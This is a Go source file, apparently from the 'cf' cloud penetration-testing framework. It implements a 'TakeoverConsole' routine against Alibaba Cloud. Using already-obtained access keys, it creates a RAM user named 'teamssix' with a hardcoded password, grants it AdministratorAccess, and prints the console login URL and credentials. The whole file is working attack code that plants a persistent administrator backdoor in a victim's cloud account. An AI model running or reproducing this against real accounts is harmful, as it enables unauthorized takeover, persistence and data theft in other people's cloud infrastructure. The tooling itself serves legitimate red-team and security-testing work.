package aliram

import (
	"fmt"

	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/util"
)

func CreateUser() {
	request := ram.CreateCreateUserRequest()
	request.Scheme = "https"
	request.UserName = "teamssix"
	_, err := RAMClient().CreateUser(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("创建 teamssix 用户成功 (Create teamssix user successfully)")
	}
}

func CreateLoginProfile() {
	request := ram.CreateCreateLoginProfileRequest()
	request.Scheme = "https"
	request.UserName = "teamssix"
	request.Password = "TeamsSix@666"
	_, err := RAMClient().CreateLoginProfile(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 teamssix 用户创建控制台登录密码 (Successfully created console login password for teamssix user)")
	}
}

func AttachPolicyToUser() {
	request := ram.CreateAttachPolicyToUserRequest()
	request.Scheme = "https"
	request.PolicyType = "System"
	request.PolicyName = "AdministratorAccess"
	request.UserName = "teamssix"
	_, err := RAMClient().AttachPolicyToUser(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 teamssix 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the teamssix user)")
	}
}

func GetAccountAlias() string {
	request := ram.CreateGetAccountAliasRequest()
	request.Scheme = "https"
	response, err := RAMClient().GetAccountAlias(request)
	util.HandleErrNoExit(err)
	accountAlias := response.AccountAlias
	return accountAlias
}

func TakeoverConsole() {
	CreateUser()
	CreateLoginProfile()
	AttachPolicyToUser()
	accountAlias := GetAccountAlias()
	username := fmt.Sprintf("teamssix@%s", accountAlias)
	data := [][]string{
		{username, "TeamsSix@666", "https://signin.aliyun.com"},
	}
	var header = []string{"用户名", "密码", "控制台登录地址"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
}
